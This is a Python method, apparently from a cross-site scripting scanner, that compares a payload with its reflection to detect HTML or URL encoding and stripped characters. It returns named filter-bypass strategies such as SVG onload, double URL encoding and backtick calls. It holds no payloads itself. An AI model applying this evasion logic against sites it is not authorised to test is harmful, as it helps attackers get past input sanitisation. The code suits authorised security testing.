    def analyze_filtering(self, original: str, reflected: str) -> dict[str, Any]:
        """
        Compare original payload to its reflection to detect filtering.

        Returns dict with filtered_chars, encoding_type, and bypass_strategy list.
        """
        result: dict[str, Any] = {
            "filtered_chars": set(),
            "encoding_type": None,
            "bypass_strategy": [],
        }
        if "&lt;" in reflected or "&gt;" in reflected or "&quot;" in reflected:
            result["encoding_type"] = "html_entity"
            result["bypass_strategy"].extend([
                "use_event_handlers", "use_javascript_protocol", "use_template_literals",
            ])
        if "%3C" in reflected or "%3E" in reflected:
            result["encoding_type"] = "url_encode"
            result["bypass_strategy"].append("double_url_encode")
        stripped = set()
        for ch in ['<', '>', '"', "'", '/', '(', ')', '{', '}', ';']:
            if ch in original and ch not in reflected:
                stripped.add(ch)
        result["filtered_chars"] = stripped
        if '<' in stripped or '>' in stripped:
            result["bypass_strategy"].extend(["use_event_handlers_no_tags", "use_svg_onload", "template_injection"])
        if '"' in stripped and "'" not in stripped:
            result["bypass_strategy"].append("single_quote_context")
        if "'" in stripped and '"' not in stripped:
            result["bypass_strategy"].append("double_quote_context")
        if '(' in stripped or ')' in stripped:
            result["bypass_strategy"].extend(["backtick_function_call", "tagged_template", "constructor_chain"])
        if ';' in stripped:
            result["bypass_strategy"].append("comma_separator")
        return result

